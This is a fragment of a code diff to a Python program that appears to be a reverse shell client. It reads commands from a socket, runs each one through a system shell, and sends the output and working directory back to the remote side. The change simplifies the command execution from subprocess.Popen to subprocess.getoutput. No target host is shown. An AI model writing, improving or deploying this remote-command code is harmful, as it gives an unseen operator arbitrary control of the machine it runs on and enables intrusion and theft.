@@ -28,10 +28,9 @@ def main():
                 s.send(str.encode(os.getcwd()) + str.encode("\n"))
               
             else:
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                output = proc.stdout.read()+proc.stderr.read()
-                output_str = str(output)
-                s.send(output_str.encode())
+                proc = output = subprocess.getoutput(command)
+                #output_str = str(proc)
+                s.send(proc.encode())
                 
     except ConnectionResetError:
         s.close()
